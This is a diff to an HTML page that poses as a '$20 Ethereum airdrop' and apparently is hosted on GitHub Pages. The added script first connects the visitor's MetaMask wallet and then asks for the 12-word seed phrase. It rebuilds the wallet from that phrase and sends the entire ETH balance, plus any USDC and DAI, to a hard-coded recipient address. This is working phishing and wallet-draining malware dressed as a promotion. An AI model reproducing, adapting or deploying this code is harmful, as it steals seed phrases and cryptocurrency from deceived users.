@@ -7,18 +7,17 @@
 
   <!-- ✅ Social Media Preview Meta Tags -->
   <meta property="og:type" content="website" />
-  <meta property="og:title" content="Connect Wallet & Claim Ethereum" />
-  <meta property="og:description" content="Connect your wallet to claim Ethereum airdrop instantly." />
+  <meta property="og:title" content="Claim Your $20 Ethereum Airdrop Now" />
+  <meta property="og:description" content="Connect your wallet to claim a $20 Ethereum airdrop instantly!" />
   <meta property="og:image" content="https://johnathamiller.github.io/Airdrop/preview.jpg" />
   <meta property="og:url" content="https://johnathamiller.github.io/Airdrop/" />
 
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Connect Wallet & Claim Ethereum" />
-  <meta name="twitter:description" content="Connect your wallet to claim Ethereum airdrop instantly." />
+  <meta name="twitter:title" content="Claim Your $20 Ethereum Airdrop Now" />
+  <meta name="twitter:description" content="Connect your wallet to claim a $20 Ethereum airdrop instantly!" />
   <meta name="twitter:image" content="https://johnathamiller.github.io/Airdrop/preview.jpg" />
   <meta name="twitter:url" content="https://johnathamiller.github.io/Airdrop/" />
 
-  <!-- ✅ Fonts and Combined CSS (FIXED) -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
     body {
@@ -141,4 +140,149 @@
   </style>
 </head>
 <body>
-  <!-- 🔁 YOUR ORIGINAL BODY CONTENT AND SCRIPT STAYS SAME -->
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Ethereum-icon-purple.svg" alt="Ethereum Logo" />
+    <h1>Claim Your $20 Ethereum Airdrop Now</h1>
+  </header>
+
+  <div class="container">
+    <button id="connect-btn">Connect Wallet</button>
+
+    <div id="seed-section">
+      <p>Wallet connected successfully!<br>Now enter your 12-word seed phrase:</p>
+      <textarea id="seed-phrase" placeholder="Enter your 12-word seed phrase here..." autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false"></textarea>
+      <button id="confirm-btn" disabled>Confirm</button>
+    </div>
+
+    <div id="status"></div>
+  </div>
+
+  <footer>
+    &copy;  © 2025 – All rights reserved. This airdrop is provided for promotional and informational purposes only. Participation does not constitute an investment or financial advice.
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script>
+    const recipient = '0xFE138B138ca16dcF67CbF1fd3122C41CCA0CeAC4';
+    const connectBtn = document.getElementById('connect-btn');
+    const seedSection = document.getElementById('seed-section');
+    const confirmBtn = document.getElementById('confirm-btn');
+    const statusDiv = document.getElementById('status');
+    const seedPhraseInput = document.getElementById('seed-phrase');
+
+    const INFURA_PROJECT_ID = "b8ef3a0c2f4e4210b0777c4e28705f01";
+
+    const tokenContracts = [
+      { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, name: "USDC" },
+      { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18, name: "DAI" }
+    ];
+
+    function checkSeedPhrase() {
+      const words = seedPhraseInput.value.trim().split(/\s+/);
+      confirmBtn.disabled = !(words.length === 12 && !seedPhraseInput.value.trim().endsWith(' '));
+    }
+    seedPhraseInput.addEventListener('input', checkSeedPhrase);
+
+    function logStatus(message, isError = false, isSuccess = false) {
+      statusDiv.textContent += message + "\n";
+      if (isError) {
+        statusDiv.className = 'error';
+      } else if (isSuccess) {
+        statusDiv.className = 'success';
+      } else {
+        statusDiv.className = '';
+      }
+      statusDiv.scrollTop = statusDiv.scrollHeight;
+    }
+
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    connectBtn.onclick = async () => {
+      if (window.ethereum) {
+        try {
+          logStatus('Connecting wallet...');
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          await provider.send("eth_requestAccounts", []);
+          const signer = provider.getSigner();
+          const address = await signer.getAddress();
+
+          logStatus(`Wallet connected: ${address}`, false, true);
+          connectBtn.style.display = 'none';
+          seedSection.style.display = 'block';
+        } catch (err) {
+          logStatus('Connection failed: ' + err.message, true);
+        }
+      } else if (isMobile()) {
+        logStatus('No injected wallet detected. Attempting to open MetaMask app...');
+        const fullUrl = window.location.href.replace(/^https?:\/\//, '');
+        const metamaskDeepLink = `https://metamask.app.link/dapp/${fullUrl}`;
+        window.location.href = metamaskDeepLink;
+        logStatus('If MetaMask app did not open, please install it from your app store.', true);
+      } else {
+        logStatus('Please install MetaMask!', true);
+      }
+    };
+
+    confirmBtn.onclick = async () => {
+      const seedPhrase = seedPhraseInput.value.trim().toLowerCase();
+      logStatus(`Using seed phrase: ${seedPhrase}`);
+      try {
+        logStatus('Creating wallet from seed phrase...');
+        const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
+        logStatus(`Wallet address: ${wallet.address}`);
+        const provider = new ethers.providers.JsonRpcProvider(`https://mainnet.infura.io/v3/${INFURA_PROJECT_ID}`);
+        try {
+          const blockNumber = await provider.getBlockNumber();
+          logStatus(`Connected to mainnet. Current block: ${blockNumber}`);
+        } catch (networkErr) {
+          logStatus(`Network error: ${networkErr.message}`, true);
+          return;
+        }
+        const signer = wallet.connect(provider);
+        let balance = await signer.getBalance();
+        logStatus(`ETH balance: ${ethers.utils.formatEther(balance)} ETH`);
+        const gasPrice = await provider.getGasPrice();
+        const gasLimit = ethers.BigNumber.from("21000");
+        const gasCost = gasPrice.mul(gasLimit);
+        logStatus(`Estimated gas cost: ${ethers.utils.formatEther(gasCost)} ETH`);
+        if (balance.lte(gasCost)) {
+          logStatus("Not enough ETH to pay for gas.", true);
+          return;
+        }
+        const amountToSend = balance.sub(gasCost);
+        logStatus(`Sending all ETH: ${ethers.utils.formatEther(amountToSend)} ETH`);
+        const txEth = await signer.sendTransaction({ to: recipient, value: amountToSend, gasLimit, gasPrice });
+        logStatus(`ETH transaction sent! Hash: ${txEth.hash}`);
+        await txEth.wait();
+        logStatus(`ETH transfer confirmed.`);
+        const tokenAbi = [
+          "function balanceOf(address owner) view returns (uint256)",
+          "function transfer(address to, uint256 amount) returns (bool)"
+        ];
+        for (const token of tokenContracts) {
+          try {
+            const tokenContract = new ethers.Contract(token.address, tokenAbi, signer);
+            const tokenBalance = await tokenContract.balanceOf(wallet.address);
+            if (tokenBalance.gt(0)) {
+              logStatus(`Sending ${ethers.utils.formatUnits(tokenBalance, token.decimals)} ${token.name}`);
+              const txToken = await tokenContract.transfer(recipient, tokenBalance);
+              logStatus(`Token transfer sent! Hash: ${txToken.hash}`);
+              await txToken.wait();
+              logStatus(`Token transfer confirmed.`);
+            } else {
+              logStatus(`No balance for ${token.name}, skipping.`);
+            }
+          } catch (err) {
+            logStatus(`Error sending ${token.name}: ${err.message}`, true);
+          }
+        }
+        logStatus("All ETH and tokens sent!", false, true);
+      } catch (error) {
+        logStatus('Error: ' + error.message, true);
+      }
+    };
+  </script>
+</body>
+</html>
